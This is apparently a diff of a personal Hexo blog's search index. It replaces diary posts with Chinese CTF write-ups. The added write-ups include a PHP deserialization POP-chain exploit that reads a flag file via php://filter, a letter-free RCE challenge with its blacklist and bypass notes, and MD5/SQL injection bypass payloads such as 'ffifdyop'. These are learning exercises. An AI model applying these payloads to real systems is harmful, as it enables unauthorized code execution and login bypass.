class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">PopukoPipimi</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$is</span> = <span class="string">&quot;Good sisters&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kiminonawa</span>,<span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;kiminonawa = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to HNCTF2022 ,&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;This is &#x27;</span>.<span class="variable language_">$this</span>-&gt;kiminonawa.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;kiminonawa;                   <span class="comment">#4</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/popzi|flag|cha|https|http|file|dict|ftp|pipimei|gopher|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;kiminonawa)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;仲良ピース!&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;kiminonawa = <span class="string">&quot;index.php&quot;</span>;             <span class="comment">#5</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>])) @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);  </span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Goodsisters</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop_EP&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;pop_EP&#x27;</span>] == <span class="string">&quot;ep683045&quot;</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;欸嘿,你也喜欢pop子~对吧ww&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
 
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的加密结果</span></span><br><span class="line">result = [<span class="number">201</span>, <span class="number">8</span>, <span class="number">198</span>, <span class="number">68</span>, <span class="number">131</span>, <span class="number">152</span>, <span class="number">186</span>, <span class="number">136</span>, <span class="number">13</span>, <span class="number">130</span>, <span class="number">190</span>, <span class="number">112</span>, <span class="number">251</span>, <span class="number">93</span>, <span class="number">212</span>, <span class="number">1</span>, <span class="number">31</span>, <span class="number">214</span>, <span class="number">116</span>, <span class="number">244</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一步：重新生成随机数种子列表 l</span></span><br><span class="line">random.seed(<span class="number">1</span>)</span><br><span class="line">l = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    l.append(random.getrandbits(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二步：解密 flag</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(l)):</span><br><span class="line">    random.seed(l[i])</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="comment"># 异或运算解密</span></span><br><span class="line">        flag += <span class="built_in">chr</span>(result[index] ^ random.getrandbits(<span class="number">8</span>))</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的 flag 为:&quot;</span>, flag)</span><br></pre></td></tr></table></figure>
+<p>exp1:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in f14g.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Popuko</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$No_893</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=f14g.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">POP_TEAM_EPIC</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$WEBSITE</span> = <span class="string">&quot;MANGA LIFE WIN&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;No_893);                   <span class="comment">#2</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$anti_takeshobo</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$anti_takeshobo</span>);                       <span class="comment">#1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipimi</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pipi</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">PIPIPMI</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$h</span> = <span class="string">&quot;超喜欢POP子ww,你也一样对吧(举刀)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Pipi美永远不会生气ww&quot;</span>;</span><br><span class="line">        <span class="comment">#$this-&gt;pipi = array();</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p=<span class="keyword">new</span> <span class="title class_">Popuko</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Goodsisters</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kiminonawa</span>, <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="keyword">new</span> <span class="title class_">Pipimi</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;kiminonawa;                   <span class="comment">#4</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/popzi|flag|cha|https|http|file|dict|ftp|pipimei|gopher|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;kiminonawa)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;仲良ピース!&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;kiminonawa = <span class="string">&quot;index.php&quot;</span>;             <span class="comment">#5</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Goodsisters</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;kiminonawa = <span class="keyword">new</span> <span class="title class_">Goodsisters</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-]]></content>
-  </entry>
-  <entry>
-    <title>《计网自顶向下》你记得什么都默下来</title>
-    <url>/2025/02/20/%E3%80%8A%E8%AE%A1%E7%BD%91%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E3%80%8B%E4%BD%A0%E8%AE%B0%E5%BE%97%E4%BB%80%E4%B9%88%E9%83%BD%E9%BB%98%E4%B8%8B%E6%9D%A5/</url>
-    <content><![CDATA[]]></content>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>博客建设记录</title>
-    <url>/2025/02/14/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E8%AE%BE%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p>主题：next gemini</p>
-<p>25&#x2F;3&#x2F;1</p>
-<p>换主题</p>
-<p>auto_excerpt:			#自动摘录（不推荐）  </p>
-<p>enable: false  </p>
-<p>length: 150</p>
-<p>(这个没有用)</p>
-<p>只能用<span id="more"></span></p>
-<p>*评论系统：valine（能看得到评论界面无法评论）</p>
-<p>*加密：测试后发现输入密码后有回显但是无法看到文章</p>
-<!--more-->
-
-<p>看板娘；神秘出现,</p>
-<p>我就输入了npm install hexo-helper-live2d –save 这一条命令就行了吗？？？</p>
-<p>25&#x2F;2&#x2F;24</p>
-<p>因为 遮挡了右边目录删掉了看板娘，画风不符</p>
-<p>25&#x2F;2&#x2F;27</p>
-<img src="/2025/02/14/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E8%AE%BE%E8%AE%B0%E5%BD%95/E8FE32616C6A10880D0E42AB9041634E.png" class="" title="E8FE32616C6A10880D0E42AB9041634E">
-
-<img src="/2025/02/14/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E8%AE%BE%E8%AE%B0%E5%BD%95/EF5FCA7498781CC07C04C295087FAA47.png" class="" title="EF5FCA7498781CC07C04C295087FAA47">
-
-]]></content>
-      <categories>
-        <category>Index</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>小米平板6与联想小新触控笔灵动版的结合</title>
-    <url>/2025/02/25/%E5%B0%8F%E7%B1%B3%E5%B9%B3%E6%9D%BF6%E4%B8%8E%E8%81%94%E6%83%B3%E5%B0%8F%E6%96%B0%E8%A7%A6%E6%8E%A7%E7%AC%94%E7%81%B5%E5%8A%A8%E7%89%88%E7%9A%84%E7%BB%93%E5%90%88/</url>
-    <content><![CDATA[<p>bl锁找闲鱼解的，模块自己刷的，就是回学校莫名其妙失灵了。</p>
-<p>在网上找到底是怎么回事，一无所获。在小红书刷到要壳脱下来，立马好了</p>
-<p>神医啊…</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>[安洵杯 2019]CSS Game</title>
-    <url>/2025/02/14/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-CSS-Game/</url>
-    <content><![CDATA[<p>题目看不懂 答案看不懂 原理也看不懂 复现也看不懂</p>
 ]]></content>
       <categories>
         <category>Web</category>
       </categories>
       <tags>
-        <tag>不懂</tag>
-        <tag>CSS注入</tag>
+        <tag>PHP</tag>
+        <tag>反序列化</tag>
+        <tag>POP链</tag>
       </tags>
   </entry>
   <entry>
-    <title>我有巨物恐惧症</title>
-    <url>/2025/02/19/%E6%88%91%E6%9C%89%E5%B7%A8%E7%89%A9%E6%81%90%E6%83%A7%E7%97%87/</url>
-    <content><![CDATA[<p>我不明白怎么有这么多工具这么多命令这么多魔术方法</p>
+    <title>[SWPUCTF 2021 新生赛]hardrce</title>
+    <url>/2025/02/14/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-hardrce/</url>
+    <content><![CDATA[<p>此题属于我之前写了一半看了wp望而却步的一部分</p>
+<p>贴个源代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>可以看出，要绕过⿊名单和正则表达式。 不能异或，不能有字⺟数字。</p>
+</blockquote>
+<p>因为if(preg_match(‘&#x2F;[a-zA-Z]&#x2F;is’,$wllm))把所有字母都禁了，所以只能取反绕过</p>
+<p>取反绕过的原理：</p>
+<blockquote>
+<p>我们将php代码url编码后取反，我们传入参数后服务端进行url解码，这时由于取反后，会url解码成不可打印字符，这样我们就会绕过。</p>
+<p>即，对查询语句取反，然后编码。在编码前加上~进行取反，括号没有被过滤，不用取反。</p>
+</blockquote>
+<p>发现一篇很有价值的文章：<a href="https://cloud.tencent.com/developer/article/1838778">Web安全 | 无字母数字Webshell 总结</a></p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>我的Waline怎么评论框都没有啊啊啊啊啊啊啊啊啊啊啊啊啊啊</title>
-    <url>/2025/02/24/%E6%88%91%E7%9A%84Waline%E6%80%8E%E4%B9%88%E8%AF%84%E8%AE%BA%E6%A1%86%E9%83%BD%E6%B2%A1%E6%9C%89%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A/</url>
-    <content><![CDATA[<p>我都是按照教程做的啊我请问呢别管了歇会NSS看着NPC的题解</p>
-<p>这样吧，你们都去</p>
-<p><a href="https://comment-ptzxs5z4j-gentle-knifes-projects.vercel.app/">https://comment-ptzxs5z4j-gentle-knifes-projects.vercel.app/</a></p>
-<p>评论</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>汉堡师傅计网方面灵魂拷问</title>
-    <url>/2025/02/11/%E6%B1%89%E5%A0%A1%E5%B8%88%E5%82%85%E8%AE%A1%E7%BD%91%E6%96%B9%E9%9D%A2%E7%81%B5%E9%AD%82%E6%8B%B7%E9%97%AE/</url>
-    <content><![CDATA[<p>现在你有以下需求：<br>1、假设你有多个需要上网的设备，同时你需要所有属于你的设备使用代理访问外网。有些设备不方便单独配置代理vpn，只能进行一些简单配置，如ip、网关<br>2、一般来说，一些路由器支持在路由器端直接配置代理，所有通过该路由器进行转发的包都会经过该代理<br>3、家里其他人需要上网，同时他们使用的网络服务都在国内不需要代理甚至不能配置代理</p>
-<p>你现在有两台路由器，你可以怎么进行配置进而满足你的需求呢？</p>
-<p>题目2：<br>1、有两个网络环境，一个是能访问互联网的路由器A，一个是全本地的局域网路由器B，你在局域网下部署有服务需要访问。<br>2、你只有一台电脑，你需要同时访问这两个网络环境，请问你应该如何配置？<br>附加：<br>如果路由器A和B的网段重合，你应该如何配置本机？</p>
-<p>题目3：有一台神秘设备连接在局域网内，你不能访问路由器后台，你应该如何获取该设备ip？ </p>
-<p>nmap用什么指令？指令是什么原理？</p>
-<h1 id="师傅还推荐用wireshark啊可惜你现在还是不太会用"><a href="#师傅还推荐用wireshark啊可惜你现在还是不太会用" class="headerlink" title="师傅还推荐用wireshark啊可惜你现在还是不太会用"></a>师傅还推荐用wireshark啊可惜你现在还是不太会用</h1>]]></content>
       <categories>
-        <category>计网</category>
+        <category>Web</category>
       </categories>
       <tags>
-        <tag>笔记</tag>
+        <tag>无字母RCE</tag>
+        <tag>RCE</tag>
+        <tag>WAF绕过</tag>
       </tags>
   </entry>
   <entry>
@@ -1013,25 +873,111 @@
       </tags>
   </entry>
   <entry>
-    <title>接口到底是什么</title>
-    <url>/2025/02/25/%E6%8E%A5%E5%8F%A3%E5%88%B0%E5%BA%95%E6%98%AF%E4%BB%80%E4%B9%88/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>永远追不上的时间</title>
-    <url>/2025/02/19/%E6%B0%B8%E8%BF%9C%E8%BF%BD%E4%B8%8D%E4%B8%8A%E7%9A%84%E6%97%B6%E9%97%B4/</url>
-    <content><![CDATA[<p>12.20下课</p>
-<p>13.00吃完麦当劳 走路回宿舍</p>
-<p>玩了一会儿手机，头不太舒服，睡了一会儿（本来只想咪到2点）</p>
-<p>15.00醒了，穿衣服，下楼洗澡</p>
-<p>15.40洗完了（没洗头所以不用吹头发）烧水，玩了五分钟NS</p>
-<p>16.10出门吃饭，瓦香鸡等了十分钟，</p>
-<p>16.57 到俱乐部，写博客</p>
-<p>实际上这已经是非常非常避开人流的作息了…如果不要求自己下午一定要来电脑面前一会儿就好很多…但是还有晚自习晚上只能学一个小时QAQ</p>
+    <title>[蓝帽杯 2022 初赛]网站取证_2</title>
+    <url>/2025/02/14/%E8%93%9D%E5%B8%BD%E6%9D%AF-2022-%E5%88%9D%E8%B5%9B-%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81-2/</url>
+    <content><![CDATA[<h1 id="省流版"><a href="#省流版" class="headerlink" title="省流版"></a>省流版</h1><p>打开”…....\网站取证\WWW\application\database.php”，把PHP版本调成7.2以下，在最后添上</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">my_encrypt</span>();</span><br></pre></td></tr></table></figure>
+
+<p>运行，结束</p>
+<h1 id="为什么可以这样做？"><a href="#为什么可以这样做？" class="headerlink" title="为什么可以这样做？"></a>为什么可以这样做？</h1><p>点击license.txt文件，发现是thinkphp框架</p>
+<p>数据库文件是application&#x2F;database.php,跳转到数据库文件，发现该文件是加密的</p>
+<p>利用代码追踪功能，追踪加密函数</p>
+<img src="/2025/02/14/%E8%93%9D%E5%B8%BD%E6%9D%AF-2022-%E5%88%9D%E8%B5%9B-%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81-2/QQ20250214-122319.png" class="" title="QQ20250214-122319">
 ]]></content>
       <categories>
-        <category>Index</category>
+        <category>取证</category>
       </categories>
+      <tags>
+        <tag>电子取证</tag>
+        <tag>网站取证</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[安洵杯 2019]CSS Game</title>
+    <url>/2025/02/14/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-CSS-Game/</url>
+    <content><![CDATA[<p>题目看不懂 答案看不懂 原理也看不懂 复现也看不懂</p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>不懂</tag>
+        <tag>CSS注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[ZJCTF 2019]NiZhuanSiWei</title>
+    <url>/2025/02/13/ZJCTF-2019-NiZhuanSiWei/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>反序列化</tag>
+        <tag>PHP伪协议</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[BJDCTF 2020]easy_md5</title>
+    <url>/2025/02/13/BJDCTF-2020-easy-md5-1/</url>
+    <content><![CDATA[<h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>dir扫扫没头绪别管了看下wp</p>
+<img src="/2025/02/13/BJDCTF-2020-easy-md5-1/QQ20250213-133501.png" class="" title="QQ20250213-133501">
+
+<p>原来我们的小提示在输入框的返回响应头里</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure>
+
+<p>从名为 <code>&#39;admin&#39;</code> 的表中，选择所有列（<code>*</code>），但条件是密码字段的值必须等于一个通过 <code>md5</code> 函数加密后生成的密码。</p>
+<p>然后呢？密码呢？注入看看，好像不会，看看wp</p>
+<p><a href="https://www.nssctf.cn/note/set/3001">https://www.nssctf.cn/note/set/3001</a></p>
+<p>当‘ or ’ 后面的值为True是，就能构成万能密码，实现绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;true&#x27;</span><br></pre></td></tr></table></figure>
+
+<h4 id="补充知识点："><a href="#补充知识点：" class="headerlink" title="补充知识点："></a>补充知识点：</h4><p><strong>MySQL的一个特性：</strong></p>
+<p>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。</p>
+<p>要注意的是这种情况是必须要有单引号括起来的，比如password&#x3D;‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password&#x3D;‘xxx’ or 1 ，也就相当于password&#x3D;‘xxx’ or true，所以返回值就是true。</p>
+<p>当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。<br>当然如果只有数字的话，就不需要单引号，比如password&#x3D;‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;1abcdefg&#x27;    ---&gt;  True</span><br><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;0abcdefg&#x27;    ---&gt;  False</span><br><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;1&#x27;           ---&gt;  True</span><br><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;2&#x27;           ---&gt;  True</span><br><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;0&#x27;           ---&gt;  False</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">for ($i = 0;;) &#123; </span><br><span class="line"> for ($c = 0; $c &lt; 1000000; $c++, $i++)</span><br><span class="line">  if (stripos(md5($i, true), &#x27;\&#x27;or\&#x27;&#x27;) !== false)</span><br><span class="line">   echo &quot;\nmd5($i) = &quot; . md5($i, true) . &quot;\n&quot;;</span><br><span class="line"> echo &quot;.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//引用于 http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/</span><br></pre></td></tr></table></figure>
+
+<h1 id="其实我看不懂下面一段"><a href="#其实我看不懂下面一段" class="headerlink" title="*其实我看不懂下面一段"></a>*其实我看不懂下面一段</h1><p>这里提供一个最常用的：<strong>ffifdyop</strong>，该字符串md5加密后若md5()的参数为True时会返回 <strong>‘or’6<trash></strong> (<trash>其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为True，后面的<trash>会在MySQL将其转换成整型比较时丢掉)</p>
+<p>所以如果这里我们输入ffifdyop，后端的SQL语句会变成：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;6&lt;trash&gt;&#x27;           ---&gt;  True</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/02/13/BJDCTF-2020-easy-md5-1/QQ20250213-135621.png" class="" title="QQ20250213-135621">
+
+<p>这个过滤我会过过过</p>
+<img src="/2025/02/13/BJDCTF-2020-easy-md5-1/QQ20250213-135937.png" class="" title="QQ20250213-135937">
+
+<h3 id="方法-1：利用已知的-MD5-碰撞"><a href="#方法-1：利用已知的-MD5-碰撞" class="headerlink" title="方法 1：利用已知的 MD5 碰撞"></a>方法 1：利用已知的 MD5 碰撞</h3><h3 id="方法-2：利用-PHP-的类型特性（如果条件允许）"><a href="#方法-2：利用-PHP-的类型特性（如果条件允许）" class="headerlink" title="方法 2：利用 PHP 的类型特性（如果条件允许）"></a>方法 2：利用 PHP 的类型特性（如果条件允许）</h3><p>数组绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">param1[]=1&amp;param2[]=2</span><br></pre></td></tr></table></figure>
+
+<p>在这种情况下：</p>
+<ul>
+<li><code>param1</code> 和 <code>param2</code> 都是数组，它们的值不同（<code>[1] !== [2]</code>）。</li>
+<li><code>md5(param1)</code> 和 <code>md5(param2)</code> 都返回 <code>null</code>，因此 <code>null === null</code> 为 <code>true</code>。</li>
+</ul>
+<p>BP一直抓的是上一次的包所以没成功太尴尬了</p>
+<h1 id="知识点总结：PHPmd5绕过"><a href="#知识点总结：PHPmd5绕过" class="headerlink" title="知识点总结：PHPmd5绕过"></a>知识点总结：PHPmd5绕过</h1><h2 id="两个等号-0e绕过（记录特殊值"><a href="#两个等号-0e绕过（记录特殊值" class="headerlink" title="两个等号 0e绕过（记录特殊值"></a>两个等号 0e绕过（记录特殊值</h2><h2 id="三个等号-数组绕过"><a href="#三个等号-数组绕过" class="headerlink" title="三个等号 数组绕过"></a>三个等号 数组绕过</h2><p>tags:</p>
+<ul>
+<li>md5</li>
+<li>弱比较</li>
+<li>强比较</li>
+<li>数组绕过</li>
+<li>PHP</li>
+</ul>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>md5</tag>
+        <tag>弱比较</tag>
+        <tag>强比较</tag>
+        <tag>数组绕过</tag>
+        <tag>PHP</tag>
+      </tags>
   </entry>
   <entry>
     <title>[网鼎杯 2018]Fakebook</title>
@@ -1110,48 +1056,102 @@
         <category>Web</category>
       </categories>
       <tags>
-        <tag>SQL注入</tag>
         <tag>反序列化</tag>
+        <tag>SQL注入</tag>
         <tag>PHP伪协议</tag>
       </tags>
   </entry>
   <entry>
-    <title>摔跤了</title>
-    <url>/2025/02/25/%E6%91%94%E8%B7%A4%E4%BA%86/</url>
-    <content><![CDATA[<p>当我骑着那辆又小又破的自行车转弯的时候，我犯了一个错——我把它扭成了锐角。事情开始变得不对劲了，车辆开始向左侧倒去，我一手拧着 车把一手撑着伞试图挣扎，事与愿违。其惨状我不想多加描述，总之损失如下：钢化膜碎了，伞弯了——事后我在试图敲直它的时候从中间裂开，膝盖和手掌擦伤了。</p>
-<p>至于我为什么顶着小雨出来，那就是另一番故事了。                                                    </p>
